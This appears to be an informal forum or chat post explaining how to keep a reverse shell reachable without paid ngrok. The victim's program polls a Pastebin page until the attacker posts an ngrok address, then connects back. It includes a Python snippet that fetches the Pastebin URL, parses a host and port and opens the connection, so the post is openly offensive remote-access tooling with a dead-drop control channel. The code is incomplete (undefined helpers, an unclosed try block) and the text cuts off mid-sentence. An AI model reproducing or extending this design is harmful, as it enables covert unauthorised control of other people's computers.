so okay ngrok is good but not if you dont use premium u have to keep the pc up and running all the time so one way you can bypass this is okay umm okay so lets say
u use python so what you can do is setup a pastebin like this one i have https://pastebin.com/X0YHVVxc so that pastebin currently has the number 1 there so lets say in a reverse shell
i need the exploited machine to connect to me but itll need a ngrok link so what we can do is lets say if we add a function that reads the pastebin every 20 or any amout of time . so if the pastebin has the letetr 1 it will keep running the cycle until the pastebin doesnt have the number 1 so when you want to connect to the victims pc you can like
update the pastebin to the ngrok link and the victim's program will extract the link and connect
so the clients program will be somethign like:
def reboot():

    fhand=urllib.request.urlopen("https://pastebin.com/raw/X0YHVVxc")
    for line in fhand:
        z=line.decode()

    z=str(z)

    print(z)


    if z=="1":
        paused()
        reboot()

    else:

        REMOTE_HOST = z[6:20]
        REMOTE_PORT=z[21:]
        REMOTE_PORT=int(REMOTE_PORT)
        print(REMOTE_PORT)
        print("[-] Connection Initiating...")
        try:
            conn.connect((REMOTE_HOST, REMOTE_PORT))
            print("[-] Connection initiated!")
            lul()

that is a very bad example but yea and the client's
